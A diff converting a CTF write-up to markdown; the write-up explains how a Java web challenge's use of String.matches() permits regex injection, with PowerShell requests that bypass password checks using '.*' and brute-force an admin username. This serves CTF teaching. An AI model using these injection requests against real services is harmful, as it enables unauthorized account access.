@@ -25,7 +25,8 @@ This challenge was the second in the Web category and it actually was the first 
 
 The main file, HarambeHub.java, contains two methods which are actually get() and post() routes to two different pages, as you can see below:
 
-<pre lang="java" class="">public class HarambeHub {
+```java
+public class HarambeHub {
     public static void main(String[] args) {
         post("/users", (req, res) -&gt; {
             String username = req.queryParams("username");
@@ -41,20 +42,26 @@ The main file, HarambeHub.java, contains two methods which are actually get() an
         });
     }
 }
-</pre>
+
+```
+
 
 Reading both source files we understand the application is capable of creating a new account and to retrieve the real_name of a user if you know its username and password.
 
 Let’s try to register a new user, using a simple Powershell code:
 
-<pre lang="powershell" class="">(Invoke-WebRequest "http://problems.ctfx.io:7003/users" -Method POST -Body @{username="Megabeets"; password="VeggiesAreGood"; real_name="Itay Cohen"}).Content
-</pre>
+```powershell
+(Invoke-WebRequest "http://problems.ctfx.io:7003/users" -Method POST -Body @{username="Megabeets"; password="VeggiesAreGood"; real_name="Itay Cohen"}).Content
+
+```
+
 
 We results with “_OK: Your username is &#8220;[Member] Megabeets&#8221;_”. As you can see, the text “[Member] “ has been added to the username we supplied. By reading the function that handles the registration process we understand that we can register a user with that name again and again. Executing the exact same code results with the exact same answer: “_OK: Your username is &#8220;[Member] Megabeets&#8221;_”. Let’s try this again but this time with “[Member] Megabeets” in the username. Now we end up with an error saying: “_FAILED: User with that name already exists!_”.
 
 Let’s take a look at the code that checks if a given username already exists:
 
-<pre lang="java" class="">...
+```java
+...
 for (User user : User.users) {
                 if(user.getUsername().matches(username)) {
                     return "FAILED: User with that name already exists!";
@@ -63,35 +70,49 @@ for (User user : User.users) {
             new User("[Member]	 " + username, password, realName);
             return "OK: Your username is \"" + "[Member] " + username + "\"";
 ...
-</pre>
+
+```
+
 
 As you can see, the code compares the two strings in attempt to check whether the username exists, but it uses String.matches() instead of String.equals(). The method String.matches() checks the match of a string to a regular rxpression pattern. Keep this in mind, it’s the key to solving the challenge. If false is returned, it creates a new User with the username “[Member] <username>”, just as we’ve seen before.
 
 But what happens if we try to register a user with a regular expression as its desired username? Does it say that the username already exists? Let’s play with it a little bit and see what we get when sending “.\*” as the password (“.\*” is the regex pattern to **anything)**.
 
-<pre lang="powershell" class="">(Invoke-WebRequest "http://problems.ctfx.io:7003/users" -Method POST -Body @{username=".*"; password="VeggiesAreGood"; real_name="Itay Cohen"}).Content
-</pre>
+```powershell
+(Invoke-WebRequest "http://problems.ctfx.io:7003/users" -Method POST -Body @{username=".*"; password="VeggiesAreGood"; real_name="Itay Cohen"}).Content
+
+```
+
 
 As expected, we received the error: &#8220;FAILED: User with that name already exists!&#8221;.
 
 Now let’s take a look at the function that retrieves the real_name of a given username.
 
-<pre lang="java" class="">public boolean verify(String username, String password) {
+```java
+public boolean verify(String username, String password) {
         return this.username.equals(username) && this.master.matches(password);
     }
-</pre>
+
+```
+
 
 This function also uses String.matches() to compare the given password with the user’s password. Let’s see it in action:
 
-<pre lang="powershell" class="">Invoke-WebRequest "http://problems.ctfx.io:7003/name" -Method Get -Body @{username="[Member] Megabeets"; password="VeggiesAreGood"}
-</pre>
+```powershell
+Invoke-WebRequest "http://problems.ctfx.io:7003/name" -Method Get -Body @{username="[Member] Megabeets"; password="VeggiesAreGood"}
+
+```
+
 
 We results with: “_Itay Cohen_”.
 
 Good. Now we’ll send the same request but this time with wildcard as the password.
 
-<pre lang="powershell">Invoke-WebRequest "http://problems.ctfx.io:7003/name" -Method Get -Body @{username="[Member] Megabeets"; password=".*"}
-</pre>
+```powershell
+Invoke-WebRequest "http://problems.ctfx.io:7003/name" -Method Get -Body @{username="[Member] Megabeets"; password=".*"}
+
+```
+
 
 We again results with: “_Itay Cohen_”.
 
@@ -104,8 +125,11 @@ That’s mean that we need to run through all the possible usernames till we fin
 
 I’ll do a simple test to check whether indeed a user begins with “[Admin]” exists. If so, only the developer can add a user with such a username because every registered username is prepend with “[Member]”.
 
-<pre lang="powershell">(Invoke-WebRequest "http://problems.ctfx.io:7003/users" -Method POST -Body @{username="^\[Admin\].*"; password="pass"; real_name="Itay Cohen"}).Content
-</pre>
+```powershell
+(Invoke-WebRequest "http://problems.ctfx.io:7003/users" -Method POST -Body @{username="^\[Admin\].*"; password="pass"; real_name="Itay Cohen"}).Content
+
+```
+
 
 “_FAILED: User with that name already exists!_”.
 
@@ -115,7 +139,8 @@ I wrote a simple script to automate the process. May the bruteforce be with us.
 
 Results:
 
-<pre class="theme:inlellij-idea">Match found: \[Admin\] A
+```
+Match found: \[Admin\] A
 Match found: \[Admin\] Ar
 Match found: \[Admin\] Arx
 Match found: \[Admin\] Arxe
@@ -130,12 +155,17 @@ Match found: \[Admin\] Arxenixisalo
 Match found: \[Admin\] Arxenixisalos
 Match found: \[Admin\] Arxenixisalose
 Match found: \[Admin\] Arxenixisaloser
-</pre>
+
+```
+
 
 It seems like we’ve found the username. Let’s get its real_name:
 
-<pre lang="powershell" class="">(Invoke-WebRequest "http://problems.ctfx.io:7003/name?username=\[Admin\] Arxenixisaloser; password=.*").content
-</pre>
+```powershell
+(Invoke-WebRequest "http://problems.ctfx.io:7003/name?username=\[Admin\] Arxenixisaloser; password=.*").content
+
+```
+
 
 And we got the flag:
 
